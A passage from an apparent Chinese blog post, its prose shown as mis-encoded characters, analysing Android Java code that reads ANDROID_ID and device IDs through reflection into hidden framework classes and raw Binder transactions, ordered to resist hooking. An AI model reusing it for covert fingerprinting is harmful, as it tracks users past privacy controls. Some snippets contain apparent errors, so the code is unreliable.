class="literal">true</span>);</span><br><span class="line">            MOVED_TO_SECURE = (HashSet&lt;String&gt;) field.get(Global);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Secure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Secure&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Secure.getDeclaredField(<span class="string">&quot;MOVED_TO_LOCK_SETTINGS&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            MOVED_TO_LOCK_SETTINGS = (HashSet&lt;String&gt;) field.get(Secure);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Secure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Secure&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Secure.getDeclaredField(<span class="string">&quot;MOVED_TO_GLOBAL&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            MOVED_TO_GLOBAL = (HashSet&lt;String&gt;) field.get(Secure);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (MOVED_TO_SECURE.contains(name)) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MOVED_TO_GLOBAL.contains(name)) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">mSecure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Global&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getStringForUser</span> <span class="operator">=</span> mSecure.getDeclaredMethod(<span class="string">&quot;getStringForUser&quot;</span>, ContentResolver.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">            getStringForUser.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> (String) getStringForUser.invoke(<span class="literal">null</span>, resolver, name, uid);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((MOVED_TO_LOCK_SETTINGS.contains(name))) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>);</span><br><span class="line">            getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.widget.ILockSettings$Stub&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">            asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">sIsSystemProcess</span> <span class="operator">=</span> Process.myUid() == Process.SYSTEM_UID;</span><br><span class="line">            <span class="keyword">if</span> (MOVED_TO_LOCK_SETTINGS.contains(name)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (binderProxy != <span class="literal">null</span> &amp;&amp; !sIsSystemProcess) &#123;</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">proxy</span> <span class="operator">=</span> binderProxy.getClass();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">getString</span> <span class="operator">=</span> proxy.getDeclaredMethod(<span class="string">&quot;getString&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">                    <span class="keyword">return</span> (String) getString.invoke(name, <span class="string">&quot;0&quot;</span>, uid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Secure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Secure&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Secure.getDeclaredField(<span class="string">&quot;sNameValueCache&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">sNameValueCache</span> <span class="operator">=</span> field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">NameValueCache</span> <span class="operator">=</span> sNameValueCache.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getStringForUser</span> <span class="operator">=</span> NameValueCache.getDeclaredMethod(<span class="string">&quot;getStringForUser&quot;</span>, ContentResolver.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="keyword">return</span> (String) getStringForUser.invoke(sNameValueCache, resolver, name, uid);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¤§é‡çš„åå°„ï¼Œè°ƒç”¨å¾ˆå¤šå®‰å“å†…éƒ¨çš„æ–¹æ³•å’Œå­—æ®µå</p><ol><li><p><code>android.os.UserHandle</code>ç±»ä¸­çš„<code>getUserId</code>é™æ€æ–¹æ³•è·å–uid</p></li><li><p><code>android.provider.Settings$Global</code>å†…éƒ¨ç±»ä¸­çš„<code>MOVED_TO_SECURE</code>å­—æ®µ</p><blockquote><p><code>MOVED_TO_SECURE</code> æ˜¯ä¸€ä¸ª <code>private static final HashSet&lt;String&gt;</code> ç±»å‹çš„å­—æ®µã€‚å®ƒçš„ä½œç”¨æ˜¯è®°å½•é‚£äº›<strong>ä» <code>Settings.Global</code> è¡¨è¿ç§»åˆ° <code>Settings.Secure</code> è¡¨çš„è®¾ç½®é¡¹çš„é”®å</strong></p><p>å½“ç³»ç»Ÿå°è¯•è®¿é—®ä¸€ä¸ªæ›¾ç»åœ¨ <code>Global</code> ä¸­ä½†ç°åœ¨å·²è¿ç§»çš„è®¾ç½®æ—¶ï¼Œä¼šæ£€æŸ¥è¿™ä¸ª <code>HashSet</code>ã€‚å¦‚æœè®¾ç½®é¡¹çš„é”®åå­˜åœ¨äº <code>MOVED_TO_SECURE</code> ä¸­ï¼Œç³»ç»Ÿå°±ä¼šé‡å®šå‘åˆ° <code>Settings.Secure</code> å»è¯»å–ï¼Œå¹¶æ‰“å°ä¸€æ¡è­¦å‘Šæ—¥å¿—</p><p>æ€»ç»“æ¥è¯´ï¼Œ<code>MOVED_TO_SECURE</code> å­—æ®µæ˜¯ <code>Settings.Global</code> ç±»å†…éƒ¨ç”¨äºå¤„ç†è®¾ç½®é¡¹è¿ç§»çš„ä¸€ä¸ªç§æœ‰é™æ€æˆå‘˜</p></blockquote><p>å¦‚æœå½“åœ¨<code>MOVED_TO_SECURE</code>è¿™ä¸ªå­—æ®µä¸­å­˜åœ¨<code>Settings.Secure.ANDROID_ID</code>çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨<code>android.provider.Settings</code> ç±»ä¸­ä¸€ä¸ªå†…éƒ¨ç±» <code>NameValueCache</code> çš„ <code>getStringForUser</code> æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯ Android ç³»ç»Ÿä¸­ä»è®¾ç½®ï¼ˆSettingsï¼‰æ•°æ®åº“ï¼ˆå¦‚ <code>System</code>, <code>Secure</code>, <code>Global</code> è¡¨ï¼‰ä¸­è¯»å–ä¸€ä¸ªç‰¹å®šé”®å€¼ï¼ˆSettingï¼‰çš„æ ¸å¿ƒé€»è¾‘</p><blockquote><p><strong>æ ¹æ®ç»™å®šçš„è®¾ç½®åç§°ï¼ˆ<code>name</code>ï¼‰å’Œç”¨æˆ·å¥æŸ„ï¼ˆ<code>userHandle</code>ï¼‰ï¼Œå®‰å…¨ã€é«˜æ•ˆåœ°ä»å†…å®¹æä¾›è€…ï¼ˆContent Providerï¼‰ä¸­æ£€ç´¢å¯¹åº”çš„å­—ç¬¦ä¸²å€¼</strong></p></blockquote></li><li><p><code>android.provider.Settings$Secure</code>å†…éƒ¨ç±»ä¸­çš„<code>MOVED_TO_LOCK_SETTINGS</code>å­—æ®µ</p><p>å¦‚æœè¯¥å­—æ®µå­˜åœ¨å¯¹åº”çš„é”®åï¼Œä¼šå…ˆè°ƒç”¨<code>android.os.ServiceManager</code>ç±»ä¸­çš„<code>getService</code>é™æ€æ–¹æ³•ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ Android æ¡†æ¶ä¸­ç”¨äºè·å–ç³»ç»ŸæœåŠ¡ï¼ˆSystem Serviceï¼‰çš„ <code>IBinder</code> æ¥å£çš„æ ¸å¿ƒæ–¹æ³•ï¼Œ<code>lock_settings</code> æ˜¯ <code>LockSettingsService</code> æœåŠ¡çš„æ³¨å†Œåç§°ã€‚è¿™ä¸ªæœåŠ¡è¿è¡Œåœ¨ <code>system_server</code> è¿›ç¨‹ä¸­ï¼Œä¸“é—¨è´Ÿè´£ç®¡ç†ä¸è®¾å¤‡é”å±å®‰å…¨ç›¸å…³çš„è®¾ç½®</p><p>ä¹‹åé€šè¿‡<code>asInterface</code>è¿”å›çš„<code>Proxy</code>è¿œç¨‹è°ƒç”¨<code>getString</code>æ¥è·å–å¯¹åº”å­—æ®µçš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> LockSettingsStorage mStorage;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getString</span><span class="params">(String key, String defaultValue, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">       checkReadPermission(key, userId);</span><br><span class="line">       <span class="keyword">return</span> mStorage.getString(key, defaultValue, userId);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>android.provider.Settings$Secure</code>å†…éƒ¨ç±»ä¸­çš„<code>MOVED_TO_GLOBAL</code>å­—æ®µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">mSecure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Global&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getStringForUser</span> <span class="operator">=</span> mSecure.getDeclaredMethod(<span class="string">&quot;getStringForUser&quot;</span>, ContentResolver.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">getStringForUser.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">return</span> (String) getStringForUser.invoke(<span class="literal">null</span>, resolver, name, uid);</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel2</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">deviceId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">        getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, Context.TELEPHONY_SERVICE);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.ITelephony$Stub&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">        asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                deviceId = binderGetHardwareInfo(context.getPackageName(),</span><br><span class="line">                        binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                        BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            deviceId = binderGetHardwareInfo(<span class="string">&quot;&quot;</span>,</span><br><span class="line">                    binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                    BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deviceId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ServiceManager</code> æä¾›çš„ <code>IBinder</code> å’Œ <code>ITelephony</code> çš„ <code>asInterface</code> æ–¹æ³•åˆ†åˆ«å·¥ä½œåœ¨ <strong>è¿æ¥å±‚</strong> å’Œ <strong>æ¥å£åè®®å±‚</strong>ï¼Œå®ƒä»¬å„å¸å…¶èŒï¼Œå…±åŒå®Œæˆäº†æ•´ä¸ªè·¨è¿›ç¨‹é€šä¿¡ï¼ˆIPCï¼‰çš„æµç¨‹</p><h3 id="deviceid"><a href="#deviceid" class="headerlink" title="deviceid"></a>deviceid</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    String deviceId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆçœ‹åº•ä¸‹</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(deviceId = ITelephonyUtil.getDeviceIdLevel2(context))</span><br><span class="line">            || !TextUtils.isEmpty(deviceId = IPhoneSubInfoUtil.getDeviceIdLevel2(context))) &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å†çœ‹ä¸­éƒ¨</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(deviceId = ITelephonyUtil.getDeviceIdLevel1(context))</span><br><span class="line">            || !TextUtils.isEmpty(deviceId = IPhoneSubInfoUtil.getDeviceIdLevel1(context))) &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å†çœ‹ä¸Šéƒ¨</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(deviceId = IPhoneSubInfoUtil.getDeviceIdLevel0(context))</span><br><span class="line">            || !TextUtils.isEmpty(deviceId = ITelephonyUtil.getDeviceIdLevel0(context))) &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">        deviceId =telephonyManager.getDeviceId();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception ignore)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deviceId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æŒ‰ç…§ä»æœ€éš¾ Hook åˆ°æœ€å®¹æ˜“ Hook çš„é¡ºåº</p><h4 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h4><p>ç¬¬ä¸€ä¸ªå…ˆä»<code>ITelephonyUtil.getDeviceIdLevel2(context)</code></p><p><code>IPhoneSubInfoUtil.getDeviceIdLevel2(context)</code>è¿™ä¸¤ä¸ªå‡½æ•°è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é£é™©  å¦‚æœåº•å±‚ROMæ”¹äº†ServiceManagerï¼Œé‚£å°±å¯èƒ½æœ‰é—®é¢˜ï¼Œä½†æ˜¯æ¦‚ç‡å¾ˆå°</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel2</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">deviceId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">        getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;iphonesubinfo&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.IPhoneSubInfo$Stub&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">        asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                deviceId = binderGetHardwareInfo(context.getPackageName(),</span><br><span class="line">                        binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                        BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            deviceId = binderGetHardwareInfo(<span class="string">&quot;&quot;</span>,</span><br><span class="line">                    binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                    BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deviceId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;iphonesubinfo&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè·å–çš„æ˜¯<code>IBinder</code>å¯¹è±¡ï¼Œæ˜¯<code>android.os.BinderProxy</code>ç±»</p><p>é€šè¿‡<code>asInterface</code>è°ƒç”¨è½¬æ¢æˆ<code>...IPhoneSubInfo$Stub$Proxy</code>ç±»</p><p>ç®€å•æ¥è¯´ï¼Œ<code>asInterface</code> å°±æ˜¯ä¸€ä¸ª<strong>é€‚é…å™¨ï¼ˆAdapterï¼‰æˆ–è€…å·¥å‚æ–¹æ³•</strong>ï¼Œå®ƒå°†ä¸€ä¸ªé€šç”¨çš„ã€åº•å±‚çš„ <code>BinderProxy</code> å¯¹è±¡ï¼Œè½¬æ¢æˆäº†ä¸€ä¸ªä¸“ç”¨çš„ã€æ˜“äºä½¿ç”¨çš„æœåŠ¡æ¥å£ä»£ç†<code>$Stub$Proxy</code>å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line"><span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">    deviceId = binderGetHardwareInfo(context.getPackageName(),</span><br><span class="line">            binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">            BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br></pre></td></tr></table></figure><p>è€ŒçœŸæ­£çš„æ ¸å¿ƒå®ç°åœ¨äº<code>binderGetHardwareInfo</code>ï¼Œæ¨¡æ‹Ÿäº†åº•å±‚çš„IPCäº¤äº’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    å…¶å®è¿™é‡Œå¤šä¸€ä¸ªå‚æ•°å¹¶æ²¡æœ‰ä»€ä¹ˆå½±å“</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">binderGetHardwareInfo</span><span class="params">(String callingPackage,</span></span><br><span class="line"><span class="params">                                            IBinder remote,</span></span><br><span class="line"><span class="params">                                            String DESCRIPTOR,</span></span><br><span class="line"><span class="params">                                            <span class="type">int</span> tid)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    android.os.<span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">    android.os.<span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">    String _result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(callingPackage)) &#123;</span><br><span class="line">            _data.writeString(callingPackage);</span><br><span class="line">        &#125;</span><br><span class="line">        remote.transact(tid, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">        _result = _reply.readString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br></pre></td></tr></table></figure><p><strong>é¦–å…ˆè·å–ä¸¤ä¸ª<code>Parcel</code>å¯¹è±¡</strong></p><blockquote><p><code>Parcel</code> æ˜¯ Android ä¸­ç”¨äºåœ¨è¿›ç¨‹é—´ä¼ é€’æ•°æ®çš„é«˜æ€§èƒ½å®¹å™¨ã€‚</p><ul><li><code>_data</code>: ç”¨æ¥æ‰“åŒ…æ‰€æœ‰éœ€è¦<strong>å‘é€ç»™</strong>è¿œç¨‹æœåŠ¡çš„æ•°æ®ï¼ŒåŒ…æ‹¬è¦è°ƒç”¨çš„æ¥å£ä¿¡æ¯å’Œæ–¹æ³•å‚æ•°</li><li><code>_reply</code>: 